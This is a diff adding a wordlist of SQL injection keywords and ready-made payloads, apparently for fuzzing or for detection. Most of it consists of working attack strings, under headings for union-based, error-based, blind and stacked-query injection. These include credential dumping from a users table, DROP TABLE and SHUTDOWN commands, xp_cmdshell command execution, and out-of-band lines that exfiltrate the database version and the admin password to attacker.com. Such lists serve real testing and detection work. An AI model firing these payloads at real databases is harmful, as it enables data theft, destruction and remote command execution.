@@ -1,0 +1,202 @@
+# SQL Keywords & Operators
+SELECT
+UNION
+UNION ALL
+ORDER BY
+GROUP BY
+HAVING
+WHERE
+LIKE
+IN
+BETWEEN
+EXISTS
+NOT
+AND
+OR
+XOR
+IS NULL
+IS NOT NULL
+DISTINCT
+LIMIT
+OFFSET
+TOP
+AS
+CASE
+WHEN
+THEN
+ELSE
+END
+JOIN
+INNER JOIN
+LEFT JOIN
+RIGHT JOIN
+FULL JOIN
+CROSS JOIN
+NATURAL JOIN
+ON
+USING
+WITH
+RECURSIVE
+# Dangerous Functions
+SLEEP()
+BENCHMARK()
+WAITFOR DELAY
+PG_SLEEP()
+DBMS_LOCK.SLEEP()
+XP_CMDSHELL
+EXEC
+EXECUTE
+SP_EXECUTESQL
+EVAL()
+LOAD_FILE()
+INTO OUTFILE
+INTO DUMPFILE
+DUMPFILE
+CHAR()
+ASCII()
+ORD()
+SUBSTRING()
+SUBSTR()
+MID()
+CONCAT()
+GROUP_CONCAT()
+HEX()
+UNHEX()
+CAST()
+CONVERT()
+ENCODE()
+DECODE()
+MD5()
+SHA1()
+PASSWORD()
+VERSION()
+DATABASE()
+USER()
+CURRENT_USER()
+SESSION_USER()
+SYSTEM_USER()
+@@VERSION
+@@HOSTNAME
+# MySQL/MariaDB
+/*!50000 ... */
+`...`
+-- -
+# PostgreSQL
+--
+;
+$$
+pg_sleep()
+pg_read_file()
+# MSSQL
+WAITFOR DELAY '0:0:5'
+OPENROWSET
+BULK INSERT
+sp_adduser
+xp_regwrite
+# Oracle
+UTL_HTTP.REQUEST()
+UTL_FILE.FOPEN()
+# SQLite
+LIKE '...' ESCAPE '...'
+# Evasion Techniques
+' OR 1=1 --
+' OR '1'='1
+' UNION SELECT null,null --
+' /*!50000SELECT*/ 1 --
+'%00'
+'%0A'
+'%0D'
+'%09'
+'%20'
+'/**/'
+'||'
+'+'
+CHR(65)||CHR(66)
+# Database Schema Exploration
+INFORMATION_SCHEMA.TABLES
+INFORMATION_SCHEMA.COLUMNS
+INFORMATION_SCHEMA.SCHEMATA
+ALL_TABLES
+DBA_TABLES
+SYSOBJECTS
+SYSTABLES
+sqlite_master
+# Privilege Escalation & OS Interaction
+GRANT
+REVOKE
+CREATE USER
+DROP USER
+ALTER USER
+FILE
+PROCESS
+SUPER
+SHUTDOWN
+LOAD DATA INFILE
+OUTFILE
+# Basic SQLi Detection Patterns
+" OR ""="
+' OR ''='
+' OR 'x'='x
+' OR 'a'='a' --
+' OR 1=1; --
+' OR '1'='1' --
+' OR 1=1#
+' OR 1=1/*
+" OR 1=1 --
+" OR 1=1#
+" OR 1=1/*
+# Union-Based SQLi Payloads
+UNION SELECT
+UNION ALL SELECT
+UNION SELECT NULL--
+UNION SELECT 1,2,3--
+UNION SELECT table_name FROM information_schema.tables--
+UNION SELECT column_name FROM information_schema.columns--
+UNION SELECT username,password FROM users--
+# Error-Based SQLi Payloads
+AND 1=CONVERT(int, @@version)
+AND 1=CAST((SELECT table_name FROM information_schema.tables) AS int)
+EXEC sp_executesql N'SELECT 1'
+OR (SELECT 1 FROM (SELECT SLEEP(5))a)
+# Boolean-Based Blind SQLi
+AND 1=1
+AND 1=2
+OR IF(1=1,SLEEP(5),0)
+OR (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'
+# Time-Based Blind SQLi
+IF(1=1,SLEEP(5),0)
+OR BENCHMARK(10000000,MD5(1))
+PG_SLEEP(5)
+# Stacked Queries (Multiple Statements)
+; DROP TABLE users--
+; SHUTDOWN WITH NOWAIT--
+'; EXEC xp_cmdshell('dir')--
+# Out-of-Band SQLi (DNS/HTTP Exfiltration)
+'; DECLARE @q VARCHAR(1024); SET @q = '\\attacker.com\' + (SELECT @@version); EXEC master..xp_dirtree @q; --
+'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test')) --
+# Bypass Techniques (Obfuscation)
+'/**/OR/**/1=1--
+'%0AOR%0A1=1--
+'||1=1--
+'+(SELECT 1)+'
+'=0+1--
+' XOR 1=1 --
+' DIV 1 --
+' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END)) --
+# Database-Specific Payloads
+# MySQL
+' OR BINARY 1=1 --
+' /*!50000OR*/ 1=1 --
+' OR 1=1 INTO OUTFILE '/tmp/test.txt' --
+'; EXEC master..xp_cmdshell('whoami') --
+' OR IS_SRVROLEMEMBER('sysadmin')=1 --
+' OR CAST(1 AS bit)=1 --
+'; SELECT pg_sleep(5) --
+' OR 1=1 FROM dual --
+' AND (SELECT UTL_INADDR.get_host_name((SELECT password FROM users WHERE username='admin')) FROM dual) IS NOT NULL --
+' OR 1=1 ORDER BY 1 --
+' AND (SELECT sql FROM sqlite_master) IS NOT NULL --
+# NoSQL Injection (MongoDB, etc.)
+' || 1==1
+'; return db.getCollectionNames()
+' && this.username!='admin'
